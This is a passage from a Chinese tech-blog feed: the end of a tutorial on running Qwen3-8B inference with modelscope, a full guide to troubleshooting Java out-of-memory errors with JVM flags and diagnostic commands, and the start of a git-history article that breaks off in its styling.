<ol>
<li><strong>环境准备：</strong> 打开 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.lab4ai.cn%2Fhome" target="_blank" title="https://www.lab4ai.cn/home" ref="nofollow noopener noreferrer">大模型实验室</a> 算力平台官网，新建一个Jupyterlab实例并启动。可以看到实例已预装了 lammafactory 0.9.4、torch 2.8 等必要的软件依赖。</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b22eecad5f8f4021a9a141c74a049c51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=rz5ggsxnsRaJeSy5mDoQhqky5CY%3D" alt="20.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b7dc046792240b0b4a49d3821f01ce0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=yt%2FDWohedNhW8BmOTtP0FOU%2Flpk%3D" alt="21.png" loading="lazy"/></p>
<ol start="2">
<li><strong>导入库与加载模型:</strong> 首先从 <code>modelscope</code> 库导入加载模型所需的函数。<code>modelscope</code> 是基于著名的 <code>transformers</code> 库构建的（关于 <code>transformers</code> 库笔者会在后续篇章详细介绍）:</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> modelscope <span class="hljs-keyword">import</span> AutoModelForCausalLM, AutoTokenizer
</code></pre>
<ol start="3">
<li><strong>定义模型：</strong> 定义模型名称，并加载分词器与模型。如果本地没有缓存，代码会自动从 ModelScope 平台下载模型文件。</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 模型名称</span>
model_name = <span class="hljs-string">"Qwen/Qwen3-8B"</span>

<span class="hljs-comment"># 加载分词器</span>
tokenizer = AutoTokenizer.from_pretrained(model_name)

<span class="hljs-comment"># 加载模型</span>
model = AutoModelForCausalLM.from_pretrained(
    model_name,
    torch_dtype=<span class="hljs-string">"auto"</span>,
    device_map=<span class="hljs-string">"auto"</span>
)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc1117421ef5471897caaff1d24bb25c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=VSfEfOLUilj9P6PJjRJ2E1pTj6E%3D" alt="22.png" loading="lazy"/></p>
<ol start="4">
<li><strong>准备输入并应用对话模板：</strong> 编写一个简单的提示词“你好”进行测试。用户输入的文本会首先被套用之前提到的对话模板。</li>
</ol>
<pre><code class="hljs language-python" lang="python">user_input=<span class="hljs-string">"你好"</span>
messages=[
    {<span class="hljs-string">'role'</span>: <span class="hljs-string">'user'</span>, <span class="hljs-string">'content'</span>: user_input}
]
text = tokenizer.apply_chat_template(
    messages,
    tokenize=<span class="hljs-literal">False</span>,
    add_generation_prompt=<span class="hljs-literal">True</span>,
    enable_thinking=<span class="hljs-literal">False</span>,
)
</code></pre>
<ol start="5">
<li><strong>分词并查看 Token ID：</strong> 应用模板后的文本，再经过分词器转化为 Token ID 序列。笔者这里打印出来结果让大家直观感受一下：</li>
</ol>
<pre><code class="hljs language-python" lang="python">model_inputs = tokenizer([text], return_tensors=<span class="hljs-string">"pt"</span>).to(model.device)
<span class="hljs-built_in">print</span>(model_inputs)
</code></pre>
<p>输出显示了一个包含 <code>input_ids</code> 的张量，这正是输入的 Token ID 序列。对比 <code>tokenizer.json</code> 中的特殊符号，你会发现序列的构成完全符合我们讲解的模板格式（尽管部分中文 Token 在打印时可能显示为字节形式，但“你好”确实被正确地分词了）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/470f4b48e63f4acd9676e4dca4ae2c39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=mtNTPuuaW7gSmE0p%2FHngOsHyiDE%3D" alt="23.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b9d234d067b41138700343b6a9b6b1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=gbkyGu2O3I2XzO4IFpsnLxC1qJE%3D" alt="24.png" loading="lazy"/></p>
<ol start="6">
<li><strong>运行模型进行推理：</strong> 现在将 Token ID 序列输入模型，让其生成后续的 Token。</li>
</ol>
<pre><code class="hljs language-python" lang="python">generated_ids = model.generate(
    **model_inputs,
    max_new_tokens=<span class="hljs-number">32768</span>
)
output_ids = generated_ids[<span class="hljs-number">0</span>][<span class="hljs-built_in">len</span>(model_inputs.input_ids[<span class="hljs-number">0</span>]):].tolist()
<span class="hljs-built_in">print</span>(output_ids)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d489e0052e64a3d8e5f1e9758617399~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=6FINLqsh5bhX8fsbFAWQwBwiKlY%3D" alt="25.png" loading="lazy"/></p>
<ol start="7">
<li><strong>解码输出：</strong> 最后使用分词器的 <code>decode</code> 方法，将模型生成的 Token ID 序列转换回人类可读的文本。<code>skip_special_tokens=True</code> 参数会自动过滤掉那些用于控制格式的特殊符号。</li>
</ol>
<pre><code class="hljs language-python" lang="python">content = tokenizer.decode(output_ids, skip_special_tokens=<span class="hljs-literal">True</span>).strip(<span class="hljs-string">"\n"</span>)
<span class="hljs-built_in">print</span>(content)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6537ecbf9ac94dbfbf8990477b16cdc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=xyO%2F%2Ft7xhpcNqbD780xey2InajY%3D" alt="26.png" loading="lazy"/></p>
<p>以上就是使用代码加载模型并获取推理输出的完整流程，与笔者之前讲解的原理完全吻合！现在相信大家已经对大模型的文件组成和生成原理有了扎实的理解，给自己点个赞吧！</p>
<p>以上完整代码大家可以关注笔者的同名微信公众号 <strong>大模型真好玩</strong>，并在公众号私信: <strong>大模型训练</strong>免费获取。</p>
<h2 data-id="heading-10">四、总结</h2>
<p>本文分享了大模型的核心文件组成与生成原理，并通过实战演示了从加载模型到获取回复的完整流程，帮助大家真正理解大模型的核心工作机制。</p>
<p>实际开发中，我们不会每次都通过NoteBook编写代码，常需将模型部署为API服务以便快捷访问。下篇分享笔者将介绍如何使用vLLM、Ollama等框架，快速将模型文件转化为可便捷调用的应用接口。大家一起期待吧~ 大家读完感兴趣可以关注笔者的同名微信公众号：大模型真好玩，获取本系列分享以及其它系列分享的全部内容。</p>
<p>大模型训练对计算资源有一定要求，尤其是GPU显存。为降低学习门槛，笔者与国内主流云平台合作，大家可以通过打开链接: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.lab4ai.cn%2Fregister%3FagentID%3Duser-XorgKKc56U" target="_blank" title="https://www.lab4ai.cn/register?agentID=user-XorgKKc56U" ref="nofollow noopener noreferrer">www.lab4ai.cn/register?ag…</a> ，体验<strong>H100 GPU 6.5小时</strong>的算力。本系列所有实战教程均将在该平台上完成，帮助大家低成本上手实践。</p>
<p>除大模型训练外，笔者也在同步更新<a href="https://juejin.cn/column/7526240014499495972" target="_blank" title="https://juejin.cn/column/7526240014499495972">《深入浅出LangChain&amp;LangGraph AI Agent 智能体开发》</a>免费专栏，要说明该专栏适合所有对 LangChain 感兴趣的学习者，无论之前是否接触过 LangChain。该专栏基于笔者在实际项目中的深度使用经验，系统讲解了使用LangChain/LangGraph如何开发智能体，目前已更新 36 讲，并持续补充实战与拓展内容。欢迎感兴趣的同学关注笔者的掘金账号与专栏，也可关注笔者的同名微信公众号<strong>大模型真好玩</strong>，每期分享涉及的代码均可在公众号私信: <strong>LangChain智能体开发</strong>免费获取。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[猿辅导二面：线上出现的OOM是如何排查的？]]></title>    <link>https://juejin.cn/post/7594742976712949794</link>    <guid>https://juejin.cn/post/7594742976712949794</guid>    <pubDate>2026-01-14T05:33:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594742976712949794" data-draft-id="7556475589264769065" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="猿辅导二面：线上出现的OOM是如何排查的？"/> <meta itemprop="keywords" content="后端,面试,Java"/> <meta itemprop="datePublished" content="2026-01-14T05:33:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员飞鱼"/> <meta itemprop="url" content="https://juejin.cn/user/1665088861772688"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            猿辅导二面：线上出现的OOM是如何排查的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1665088861772688/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员飞鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T05:33:38.000Z" title="Wed Jan 14 2026 05:33:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p><strong>文章内容收录到个人网站，方便阅读</strong>：<a href="https://link.juejin.cn?target=http%3A%2F%2Fhardyfish.top%2F" target="_blank" title="http://hardyfish.top/" ref="nofollow noopener noreferrer">hardyfish.top/</a></p>
<p><strong>看是哪种OOM?</strong></p>
<p>看报错信息/监控/容器事件，区分类型，不同解法完全不一样。</p>
<blockquote>
<p><strong>Java heap</strong></p>
<ul>
<li><code>java.lang.OutOfMemoryError: Java heap space</code></li>
<li><code>GC overhead limit exceeded</code>（一直 GC 但回收极少）</li>
</ul>
<p><strong>Direct/Off-heap</strong></p>
<ul>
<li><code>java.lang.OutOfMemoryError: Direct buffer memory</code>（NIO/Netty/ByteBuffer）</li>
<li>原生内存耗尽（JNA、压缩、TLS、线程栈等）</li>
</ul>
<p><strong>Metaspace</strong></p>
<ul>
<li><code>java.lang.OutOfMemoryError: Metaspace</code>（类加载泄漏/频繁重载）</li>
</ul>
<p><strong>系统/容器把进程杀了</strong></p>
<ul>
<li>K8s：<code>OOMKilled</code>；Linux：<code>dmesg</code> 里 <code>Out of memory: Kill process</code></li>
<li>JVM 日志未必有 OOM 栈</li>
</ul>
</blockquote>
<blockquote>
<p><strong>判定方法</strong>：应用日志、K8s 事件 (<code>kubectl describe pod</code>)、系统日志 (<code>dmesg</code>)、JVM 日志（GC/错误日志）。</p>
</blockquote>
<p><strong>快速止血（把服务活下来）</strong></p>
<blockquote>
<p><strong>扩容/降流/限并发</strong>：临时缩小线程池或限流；必要时扩副本。</p>
<p><strong>增配但留余量</strong>：容器 <code>memoryLimit</code> ↑，同时 <strong>Xmx 要明显小于 limit</strong>（给 off-heap/线程/代码缓存留 30% 余量）。</p>
<p><strong>降级</strong>：关闭大对象功能（一次性加载、导出、聚合）、降低批量大小。</p>
<p><strong>打开取证开关</strong>（见下一步），重启服务。</p>
</blockquote>
<p><strong>取证与快速体检（上线就该常备）</strong></p>
<p><strong>JVM 启动参数（长期建议）</strong></p>
<ul>
<li><code>-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/data/dump</code>（自动导出 heap dump）</li>
<li><code>-Xlog:gc*:file=/data/logs/gc.log:time,uptime,level,tags</code>（JDK9+；JDK8 用 <code>-Xloggc</code>）</li>
<li>（可选）<code>-XX:NativeMemoryTracking=summary</code>（开销小）或 <code>detail</code></li>
</ul>
<p><strong>线上排查常用命令</strong></p>
<ul>
<li>线程/堆：
<ul>
<li><code>jcmd &lt;pid&gt; GC.heap_info</code>、<code>jcmd &lt;pid&gt; GC.class_histogram</code></li>
<li><code>jmap -histo:live &lt;pid&gt; | head -50</code>（大对象分布）</li>
<li><code>jmap -dump:live,format=b,file=heap.hprof &lt;pid&gt;</code></li>
<li><code>jstack -l &lt;pid&gt;</code>（看看是否卡某些线程/ThreadLocal 泄漏）</li>
</ul>
</li>
<li>原生内存：
<ul>
<li><code>jcmd &lt;pid&gt; VM.native_memory summary</code>（NMT：看 Direct / Internal / Thread 等占用）</li>
</ul>
</li>
<li>容器/系统：
<ul>
<li><code>kubectl top pod</code> / <code>describe pod</code>（<code>OOMKilled</code>）</li>
<li><code>ps -o pid,rss,command -p &lt;pid&gt;</code>、<code>pmap -x &lt;pid&gt;</code>、<code>dmesg | tail</code></li>
</ul>
</li>
</ul>
<p><strong>对症下药（不同 OOM 的根因与修复）</strong></p>
<p><strong>Heap OOM / GC Overhead</strong></p>
<blockquote>
<p><strong>症状</strong>：堆占用持续上升或 Full GC 频繁。</p>
<p><strong>定位</strong>：用 Dump 在 MAT/VisualVM 看 <strong>Dominator Tree</strong>、GC Roots 路径，找最大保留集。</p>
</blockquote>
<p><strong>常见根因 &amp; 修复</strong></p>
<ul>
<li><strong>无限制缓存/Map</strong>（没有 TTL/最大容量）→ 上 Caffeine/Guava <strong>Size/Weight + TTL</strong>，监控命中率与大小</li>
<li><strong>聚合/拼装大对象</strong>（一次性 <code>toList()</code>、大 <code>StringBuilder</code>、无分页）→ 分页/分块处理，流式读写</li>
<li><strong>ThreadLocal 泄漏</strong>（未 <code>remove</code>）→ try/finally 清理；线程池复用时尤需注意</li>
<li><strong>反序列化/JSON 组装大对象</strong> → 换流式解析（Jackson streaming）、限制字段</li>
<li><strong>序列化队列堆积</strong>（MQ/队列消费不过来）→ 限流/背压，调小批量</li>
</ul>
<p><strong>调参兜底</strong>：</p>
<ul>
<li>合理设置 <strong>Xms=Xmx</strong>（避免频繁扩容），用 <strong>G1/GenZ</strong>。</li>
<li>检查 <code>-XX:MaxRAMPercentage</code>（容器内）与 Limit 的匹配，确保 <strong>Xmx &lt; Limit × 0.7</strong> 左右。</li>
</ul>
<p><strong>Direct buffer / Off-heap OOM</strong></p>
<blockquote>
<p><strong>症状</strong>：报 <code>Direct buffer memory</code> 或 RSS 高而堆不高。</p>
<p><strong>定位</strong>：NMT（<code>VM.native_memory summary</code>）、应用指标（Netty PooledArena）、<code>-XX:MaxDirectMemorySize</code>。</p>
</blockquote>
<p><strong>根因 &amp; 修复</strong></p>
<ul>
<li><strong>未释放 ByteBuffer/Netty ByteBuf</strong> → 确保 <code>release()</code>：用 Try-With-Resources 包装，开启 Netty 泄漏检测 <code>-Dio.netty.leakDetectionLevel=paranoid</code>（只在测试/预发）</li>
<li><strong>无上限的直接内存</strong> → 配置 <code>-XX:MaxDirectMemorySize=256m~1g</code>；Netty 配对象池且限制最大并发</li>
<li><strong>大响应/压缩/SSL 原生内存</strong> → 减小批量、分块，确认本地/Native 库版本</li>
</ul>
<p><strong>Metaspace OOM</strong></p>
<p><strong>症状</strong>：<code>OutOfMemoryError: Metaspace</code>。</p>
<p><strong>根因</strong>：<strong>类加载器泄漏</strong>（反复热加载/动态代理生成类、URLClassLoader 未关闭）。</p>
<p><strong>修复</strong>：</p>
<ul>
<li>修正热加载逻辑；减少频繁生成新 Class。</li>
<li>调整 <code>-XX:MaxMetaspaceSize</code> 但重点是修复泄漏。</li>
<li><code>jcmd &lt;pid&gt; VM.classloaders</code>、<code>GC.class_stats</code> 辅助判断。</li>
</ul>
<p><strong>unable to create new native thread</strong></p>
<p><strong>症状</strong>：线程数爆表或系统 <code>ulimit -u</code> 限制。</p>
<p><strong>修复</strong>：</p>
<ul>
<li><strong>控线程池并发</strong>、合并池；合理 <code>queue</code> 与拒绝策略。</li>
<li>调整容器/系统线程数限制。</li>
<li>用 <code>jstack</code>/<code>top -H</code> 找线程源头（哪个池在疯狂建线程）。</li>
</ul>
<p><strong>容器 OOMKilled（非 JVM 报 OOM）</strong></p>
<p><strong>症状</strong>：Pod 被杀，JVM没栈。</p>
<p><strong>修复</strong>：</p>
<ul>
<li>JVM 堆（Xmx）+ 原生内存之和 <strong>必须显著小于</strong> K8s Limit。</li>
<li>JDK11+ 使用 <code>-XX:MaxRAMPercentage</code>（如 50）配合 Limit。</li>
<li>预留线程栈/Direct/Metaspace/CodeCache 等空间（通常 ≥ 30% 预留）。</li>
</ul>
<p><strong>防复发（工程化治理）</strong></p>
<ul>
<li><strong>监控告警</strong>：堆使用率、Young/Old GC 次数与时间、Full GC、RSS、Direct 内存、线程数、类加载数、对象分配速率。</li>
<li><strong>容量/压测</strong>：关键接口做 3× 峰值压测，观察 P95/P99 与 RSS；设置<strong>自动化内存回归测试</strong>。</li>
<li><strong>限流与背压</strong>：线程池有界队列 + 合理拒绝策略；对外部依赖设置超时与舱壁。</li>
<li><strong>数据/批量</strong>：所有批处理/导出/聚合都<strong>限制批大小</strong>并流式处理。</li>
<li><strong>开关与熔断</strong>：配置化关闭大对象功能；遇压自动降级。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[git 删除历史记录或历史大文件后 提交历史记录到新的仓库]]></title>    <link>https://juejin.cn/post/7594854295746740260</link>    <guid>https://juejin.cn/post/7594854295746740260</guid>    <pubDate>2026-01-14T04:27:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594854295746740260" data-draft-id="7594859060857028618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="git 删除历史记录或历史大文件后 提交历史记录到新的仓库"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-01-14T04:27:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户383551424028"/> <meta itemprop="url" content="https://juejin.cn/user/1927883862054073"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            git 删除历史记录或历史大文件后 提交历史记录到新的仓库
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927883862054073/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户383551424028
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T04:27:56.000Z" title="Wed Jan 14 2026 04:27:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body 